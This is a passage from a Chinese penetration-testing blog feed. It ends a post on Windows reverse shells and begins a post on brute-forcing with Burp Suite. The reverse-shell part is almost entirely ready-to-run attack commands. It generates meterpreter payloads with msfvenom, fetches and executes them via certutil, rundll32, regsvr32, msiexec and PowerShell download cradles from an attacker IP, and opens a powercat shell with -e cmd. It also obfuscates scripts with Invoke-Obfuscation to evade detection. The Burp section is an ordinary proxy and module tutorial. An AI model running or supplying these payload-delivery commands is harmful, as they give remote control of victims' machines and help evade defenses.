<h6 id="MSF-SMB-Delivery"><a href="#MSF-SMB-Delivery" class="headerlink" title="MSF  SMB Delivery"></a>MSF  SMB Delivery</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/windows/smb/smb_delivery</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit(windows/smb/smb_delivery) &gt; exploit <span class="literal">-j</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">&gt;rundll32.exe \\<span class="number">192.168</span>.<span class="number">31.246</span>\bupl\test.dll,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/8.png"></p>
<h6 id="Msfvenom生成反弹shell的dll"><a href="#Msfvenom生成反弹shell的dll" class="headerlink" title="Msfvenom生成反弹shell的dll"></a>Msfvenom生成反弹shell的dll</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-a</span> x64 -<span class="literal">-platform</span> windows <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">6666</span> <span class="operator">-f</span> dll &gt; lyxc.dll</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">6666</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/lyxc.dll	<span class="comment">#从控制端下载msfvenom生成的dll文件</span></span><br><span class="line">rundll32 shell32.dll,Control_RunDLL C:\Users\LYXC\lyxc.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/9.png"></p>
<h6 id="利用Rundll32加载hta反弹shell"><a href="#利用Rundll32加载hta反弹shell" class="headerlink" title="利用Rundll32加载hta反弹shell"></a>利用Rundll32加载hta反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">7777</span> <span class="operator">-f</span> hta<span class="literal">-psh</span> &gt; <span class="number">2</span>.hta</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-P</span> <span class="number">7777</span> <span class="literal">-H</span> <span class="number">192.167</span>.<span class="number">31.246</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">2</span>.hta </span><br><span class="line">rundll32.exe url.dll,OpenURL C:\User\LYXC\<span class="number">2</span>.hta</span><br></pre></td></tr></table></figure>



<h4 id="Regsvr32-exe"><a href="#Regsvr32-exe" class="headerlink" title="Regsvr32.exe"></a>Regsvr32.exe</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。 Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
<blockquote>
<p>语法:</p>
<p>Regsvr32 [/s] [/u] [/n][/i[:cmdline]]  </p>
<p>/u - 注销服务器 </p>
<p>/i - 调用DllInstall传递一个可选的[cmdline];当它与/u一起使用时，它调用dll来卸载 </p>
<p>/n - 不要调用DllRegisterServer; 此选项必须与/i一起使用 </p>
<p>/s - 沉默; 不显示消息框</p>
</blockquote>
<h6 id="Web-Delivery模块启动Regsvr32"><a href="#Web-Delivery模块启动Regsvr32" class="headerlink" title="Web Delivery模块启动Regsvr32"></a>Web Delivery模块启动Regsvr32</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> srvhost <span class="number">192.168</span>.<span class="number">31.246</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> target <span class="number">3</span></span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit (web_delivery)&gt; <span class="built_in">set</span> lhost <span class="number">192.168</span>.<span class="number">31.246</span> </span><br><span class="line">msf6 exploit (web_delivery)&gt; exploit –j</span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">regsvr32 /s /n /u /i:http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8080</span>/<span class="number">3</span>urTH83.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/10.png"></p>
<h4 id="Certuil-exe"><a href="#Certuil-exe" class="headerlink" title="Certuil.exe"></a>Certuil.exe</h4><p>Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们可以使用此工具在目标计算机中执行恶意的exe文 件以获得meterpreter会话。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">6667</span> <span class="operator">-f</span> exe &gt; msf6667.exe</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe c:\windows\temp\msf6667.exe &amp; <span class="built_in">start</span> </span><br><span class="line">c:\windows\temp\msf6667.exe</span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">192.168</span>.<span class="number">31.246</span>:<span class="number">8000</span>/msf6667.exe delete</span><br></pre></td></tr></table></figure>



<h4 id="msiexec-exe"><a href="#msiexec-exe" class="headerlink" title="msiexec.exe"></a>msiexec.exe</h4><p>MSI就是microsoft installer的简写，是微软格式的安装包。一般是程序的安装软件包。 msiexe.exe是Windows系统安装引擎，MSI包就是使用msiexe.exe来解释安装。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">9999</span> <span class="operator">-f</span> msi &gt; <span class="number">1</span>.msi</span><br><span class="line">python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">msf &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">9999</span></span><br><span class="line">msiexec /q /i http://<span class="number">192.168</span>.<span class="number">31.246</span>/<span class="number">1</span>.msi</span><br></pre></td></tr></table></figure>



<h4 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h4><h6 id="PowerShell加载远程脚本"><a href="#PowerShell加载远程脚本" class="headerlink" title="PowerShell加载远程脚本"></a>PowerShell加载远程脚本</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8899</span> <span class="operator">-f</span> psh<span class="literal">-reflection</span> <span class="literal">-o</span> shell.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/11.png"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">powershell -windowstyle <span class="keyword">hidden</span> -exec bypass -<span class="keyword">c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/shell.ps1&#x27;)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/12.png"></p>
<h6 id="PowerShell脚本Powercat"><a href="#PowerShell脚本Powercat" class="headerlink" title="PowerShell脚本Powercat"></a>PowerShell脚本Powercat</h6><p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码 的有效载荷。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/powercat.ps1&#x27;);powercat -c </span></span><br><span class="line"><span class="string">192.168.31.246 -p 8888 -e cmd&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/13.png"></p>
<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/14.png"></p>
<h6 id="通过Web-delivery反弹shell"><a href="#通过Web-delivery反弹shell" class="headerlink" title="通过Web delivery反弹shell"></a>通过Web delivery反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(web_delivery) &gt; <span class="built_in">set</span> target <span class="number">2</span></span><br><span class="line">msf6 exploit(web_delivery) &gt; exploit <span class="literal">-j</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/15.png"></p>
<h6 id="通过PowerShell启动cscript-exe"><a href="#通过PowerShell启动cscript-exe" class="headerlink" title="通过PowerShell启动cscript.exe"></a>通过PowerShell启动cscript.exe</h6><p>PowerShell允许客户端通过执行cscript.exe来运行wsf、js和vbscript脚本。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">7777</span> <span class="operator">-f</span> vbs <span class="literal">-o</span> <span class="number">3</span>.vbs</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">7777</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;(New-Object </span></span><br><span class="line"><span class="string">System.NET.WebClient).DownloadFile(&#x27;http://192.168.31.246/1.vbs&#x27;,\&quot;</span><span class="variable">$env:temp</span>\test.vbs\<span class="string">&quot;);StartProcess %windir%\system32\cscript.exe \&quot;</span><span class="variable">$env:temp</span>\test.vbs\</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/16.png"></p>
<h6 id="通过PowerShell启动BAT文件攻击"><a href="#通过PowerShell启动BAT文件攻击" class="headerlink" title="通过PowerShell启动BAT文件攻击"></a>通过PowerShell启动BAT文件攻击</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8888</span> <span class="literal">-o</span> <span class="number">1</span>.bat</span><br><span class="line">msf6 &gt; handler <span class="literal">-p</span> cmd/windows/powershell_reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4455</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://192.168.31.246:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="Metasploit生成exe文件"><a href="#Metasploit生成exe文件" class="headerlink" title="Metasploit生成exe文件"></a>Metasploit生成exe文件</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">31.246</span> LPORT=<span class="number">4445</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="number">1</span>.exe</span><br><span class="line">msf5 &gt; handler <span class="literal">-p</span> windows/x64/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">4445</span></span><br><span class="line"><span class="comment">#被控端</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start</span> <span class="number">1</span>.exe</span><br><span class="line">powershell <span class="literal">-ep</span> bypass <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> (<span class="built_in">new-object</span> system.net.webclient).DownloadFile(<span class="string">&#x27;http://192.168.31.246:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);<span class="built_in">start-process</span> <span class="number">1</span>.exe</span><br></pre></td></tr></table></figure>



<h4 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h4><h6 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line"><span class="built_in">Import-Module</span> ./<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br><span class="line"><span class="built_in">Invoke-Obfuscation</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/17.png"></p>
<h6 id="设置混淆脚本代码位置："><a href="#设置混淆脚本代码位置：" class="headerlink" title="设置混淆脚本代码位置："></a>设置混淆脚本代码位置：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath D:\WEB\工具库\反弹shell\Windows反弹shell\PSBase64Convert.ps1</span><br></pre></td></tr></table></figure>

<h6 id="选择混淆方式"><a href="#选择混淆方式" class="headerlink" title="选择混淆方式"></a>选择混淆方式</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">TOKEN\ALL\<span class="number">1</span>：</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/18.png"></p>
<h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>使用burp进行暴力破解</title>
    <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
<span id="more"></span>

<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p>
<h3 id="0X01-暴力破解"><a href="#0X01-暴力破解" class="headerlink" title="0X01 暴力破解"></a>0X01 <strong>暴力破解</strong></h3><p>​    一般使用暴力破解都有两种原因：</p>
<ol>
<li><p>对这个漏洞的测试，人是可以完成的，即可穷举。</p>
</li>
<li><p>人可以完成，但是代价太大，或者太浪费时间。</p>
<p>正是出于这样的问题，一些软件的出现帮助人完成了这些测试，这就是暴力破解的真正好处。在业界曾经有这样的一种看法，对于暴力破解的使用都不屑一          顾，因为大家觉得技术含量太低。但是，从实际的情况来看，因为用户使用弱口令情况太普遍，导致很多漏洞使用暴力破解都可以轻松拿下。</p>
<p>暴力破解，最有价值的地方是在对字典的构造上，这是一门技术，需要长期的经验积累。</p>
</li>
</ol>
<h3 id="0x02-Burp-Suite代理和浏览器设置"><a href="#0x02-Burp-Suite代理和浏览器设置" class="headerlink" title="0x02 Burp Suite代理和浏览器设置"></a>0x02 Burp Suite代理和浏览器设置</h3><p>​    当Burp Suite 启动之后，默认分配的代理地址和端口是127.0.0.1 ：8080,可以从Burp Suite的proxy选项卡的options上查看。</p>
<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p>
<h4 id="1-IE设置"><a href="#1-IE设置" class="headerlink" title="1. IE设置"></a>1. IE设置</h4><h5 id="1-启动IE浏览器"><a href="#1-启动IE浏览器" class="headerlink" title="(1)  启动IE浏览器"></a>(1)  启动IE浏览器</h5><h5 id="2-点击【工具】菜单，选择【Internet】选项"><a href="#2-点击【工具】菜单，选择【Internet】选项" class="headerlink" title="(2)  点击【工具】菜单，选择【Internet】选项"></a>(2)  点击【工具】菜单，选择【Internet】选项</h5><h5 id="3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。"><a href="#3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。" class="headerlink" title="(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。"></a>(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p>
<h5 id="4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置"><a href="#4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置" class="headerlink" title="(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置"></a>(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.png"></p>
<h5 id="5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面"><a href="#5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面" class="headerlink" title="(5)  这时，IE的设置已经完成，你可以访问 http://burp 将会看到Burp Suite的欢迎界面"></a>(5)  这时，IE的设置已经完成，你可以访问 <a href="http://burp/">http://burp</a> 将会看到Burp Suite的欢迎界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p>
<h4 id="2-FireFox设置"><a href="#2-FireFox设置" class="headerlink" title="2. FireFox设置"></a>2. FireFox设置</h4><p>​    与IE的设置类似，在FireFox中，我们也要进行一些参数设置，才能将FireFox浏览器的通信流量，通过Burp Suite代理进行传输。详细的步骤如下：</p>
<h5 id="1-启动FireFox浏览器，点击【工具】菜单，点击【选项】"><a href="#1-启动FireFox浏览器，点击【工具】菜单，点击【选项】" class="headerlink" title="(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】"></a>(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png"></p>
<h5 id="2-依次点击【高级】-【网络】【设置】"><a href="#2-依次点击【高级】-【网络】【设置】" class="headerlink" title="(2)    依次点击【高级】 【网络】【设置】"></a>(2)    依次点击【高级】 【网络】【设置】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p>
<h5 id="3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"><a href="#3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。" class="headerlink" title="(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"></a>(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p>
<h4 id="3-Google-Chrome设置"><a href="#3-Google-Chrome设置" class="headerlink" title="3. Google Chrome设置"></a>3. Google Chrome设置</h4><p>​    Google Chrome使用Burp Suite作为代理服务器的配置步骤如下：</p>
<h5 id="1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面"><a href="#1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面" class="headerlink" title="(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面"></a>(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p>
<h5 id="2-在搜索中搜索代理，点击进入"><a href="#2-在搜索中搜索代理，点击进入" class="headerlink" title="(2)  在搜索中搜索代理，点击进入"></a>(2)  在搜索中搜索代理，点击进入</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.png"></p>
<h5 id="3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"><a href="#3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。" class="headerlink" title="(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"></a>(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。</h5><h3 id="0x03-熟悉comparer，repeater，intruder模块"><a href="#0x03-熟悉comparer，repeater，intruder模块" class="headerlink" title="0x03 熟悉comparer，repeater，intruder模块"></a>0x03 <strong>熟悉comparer，repeater，intruder模块</strong></h3><h4 id="1-comparer模块"><a href="#1-comparer模块" class="headerlink" title="1.  comparer模块"></a>1.  comparer模块</h4><h5 id="1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。"><a href="#1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。" class="headerlink" title="(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。"></a>(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.png"></p>
<h5 id="2-此时，compare模块，上下界面多了一条记录"><a href="#2-此时，compare模块，上下界面多了一条记录" class="headerlink" title="(2)  此时，compare模块，上下界面多了一条记录"></a>(2)  此时，compare模块，上下界面多了一条记录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.png"></p>
<h5 id="3-使用同样的方法，我们在为comparer模块添加另外的一条记录"><a href="#3-使用同样的方法，我们在为comparer模块添加另外的一条记录" class="headerlink" title="(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录"></a>(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录</h5><h5 id="4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）"><a href="#4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）" class="headerlink" title="(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）"></a>(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.png"></p>
<h4 id="2-repeater模块"><a href="#2-repeater模块" class="headerlink" title="2.  repeater模块"></a>2.  repeater模块</h4><h5 id="1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了"><a href="#1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了" class="headerlink" title="(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了"></a>(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/14.png"></p>
<h5 id="2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"><a href="#2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。" class="headerlink" title="(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"></a>(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/15.png"></p>
<h4 id="3-Intruder-模块"><a href="#3-Intruder-模块" class="headerlink" title="3. Intruder 模块"></a>3. Intruder 模块</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
<ol>
<li><p>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</p>
</li>
<li><p>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</p>
</li>
